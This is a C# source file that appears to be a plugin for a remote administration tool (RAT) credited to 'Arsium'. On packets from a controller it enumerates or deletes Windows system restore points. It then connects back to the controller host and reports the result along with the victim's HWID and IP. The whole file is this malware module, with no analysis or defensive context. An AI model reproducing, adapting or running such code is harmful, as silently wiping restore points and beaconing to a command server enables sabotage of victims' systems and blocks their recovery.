using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.UAC_GET_RESTORE_POINT:
                    RestorePointPacket restorePointPacket = new RestorePointPacket(GetRestorePoints.GetAllRestorePoints(), loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, restorePointPacket);
                    break;

                case PacketType.UAC_DELETE_RESTORE_POINT:
                    DeleteRestorePointPacket deleteRestorePoint = new DeleteRestorePointPacket(((DeleteRestorePointPacket)loadingAPI.currentPacket).index, DeleteRestorePoint.DeleteARestorePoint(((DeleteRestorePointPacket)loadingAPI.currentPacket).index), loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, deleteRestorePoint);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
        private static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);
            clientHandler.SendPacket(packet);
        }
    }
}
